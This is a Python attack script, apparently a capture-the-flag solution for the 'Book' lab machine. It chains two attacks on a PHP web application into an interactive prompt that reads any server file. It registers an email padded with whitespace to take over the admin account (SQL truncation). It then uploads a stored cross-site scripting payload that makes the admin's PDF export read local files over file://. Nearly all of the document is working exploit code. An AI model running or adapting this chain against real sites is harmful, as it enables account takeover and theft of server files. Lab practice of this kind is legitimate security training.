#!/usr/bin/env -S uv run --script
#!/usr/bin/python3

import requests
from cmd import Cmd
from tika import parser


class Terminal(Cmd):
    prompt = "book> "
    base_url = "http://10.129.95.163"

    def __init__(self):
        super().__init__()
        email = "admin@test.com"
        password = "admin"
        self.user_sess = requests.session()
        #self.user_sess.proxies = {'http':'http://127.0.0.1:8080'}
        self.user_sess.get(f'{self.base_url}/index.php')
        self.user_sess.post(f'{self.base_url}/index.php', data=f"name=test&email={email}&password={password}",
                headers={'Content-Type': 'application/x-www-form-urlencoded'})
        resp = self.user_sess.post(f'{self.base_url}/index.php', data=f"email={email}&password={password}",
                headers={'Content-Type': 'application/x-www-form-urlencoded'})
        if "Nope" in resp.text:
            print("[-] Failed to log in as user")
            exit()
        print(f"Session created as user: {self.user_sess.cookies['PHPSESSID']}")

        self.admin_sess = requests.session()
        #self.admin_sess.proxies = {'http':'http://127.0.0.1:8080'}
        self.admin_sess.get(f'{self.base_url}/index.php')
        self.admin_sess.post(f'{self.base_url}/index.php', data="name=test&email=admin@book.htb                 .&password=test123",
                headers={'Content-Type': 'application/x-www-form-urlencoded'})
        resp = self.admin_sess.post(f'{self.base_url}/admin/', data='email=admin%40book.htb&password=test123',
                headers={'Content-Type': 'application/x-www-form-urlencoded'})
        if "Nope" in resp.text:
            print("[-] Failed to log in as admin")
            exit()
        print(f'Session created as admin: {self.admin_sess.cookies["PHPSESSID"]}')


    def default(self, args):
        # Upload XSS
        files = {'Upload': ('file.pdf', 'dummy data', 'application/pdf')}
        values = {'title': '<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file://' + args + '");x.send();</script>',
                  'author': '0xdf',
                  'Upload': 'Upload'}
        resp = self.user_sess.post(f'{self.base_url}/collections.php', files=files, data=values, allow_redirects=False, proxies={'http':'http://127.0.0.1:8080'})

        # Get Results
        resp = self.admin_sess.get(f'{self.base_url}/admin/collections.php?type=collections')
        pdf = parser.from_buffer(resp.content)
        print(pdf['content'].strip())

term = Terminal()
try:
    term.cmdloop()
except KeyboardInterrupt:
    print()